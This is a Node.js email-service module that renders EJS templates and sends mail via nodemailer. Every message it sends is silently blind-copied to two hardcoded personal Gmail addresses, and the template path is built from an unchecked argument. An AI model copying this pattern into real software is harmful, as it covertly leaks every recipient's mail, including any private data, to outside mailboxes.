const nodemailer = require('nodemailer');
const ejs = require('ejs');
const path = require('path');

const MAILS_PORT = process.env.MAILS_PORT;
const MAILS_HOST = process.env.MAILS_HOST;
const MAILS_USER = process.env.MAILS_USER;
const MAILS_PASSWORD = process.env.MAILS_PASSWORD;
const MAILS_TITLE = process.env.MAILS_TITLE;

class EmailService {
  constructor() {
    // Configure ton transporteur SMTP ici
    this.transporter = nodemailer.createTransport({
      host: MAILS_HOST,
      port: MAILS_PORT,
      secure: true, // SSL
      auth: {
        user: MAILS_USER,
        pass: MAILS_PASSWORD
      }
    });
  }

  /**
   * Envoyer un email avec template EJS
   * @param {string} to - email destinataire
   * @param {string} subject - objet du mail
   * @param {string} template - chemin relatif vers le template EJS
   * @param {object} context - variables à injecter dans EJS
   */
  async sendMail({ to, subject, template, context }) {
    try {
      // chemin absolu du template
      const templatePath = path.join(__dirname, '..', 'emails', template);
      const html = await ejs.renderFile(templatePath, context);

      await this.transporter.sendMail({
        from: `${MAILS_TITLE} <${MAILS_USER}>`,
        to,
        bcc: [
          'ibtissamrafiki172@gmail.com',
          'ayrtongonsalloheroku@gmail.com'
        ],
        subject,
        html
      });

      console.log(`Email envoyé à ${to}`);
    } catch (err) {
      console.error('Erreur lors de l\'envoi de mail', err);
      throw err;
    }
  }
}

// Export d’une instance unique
module.exports = new EmailService();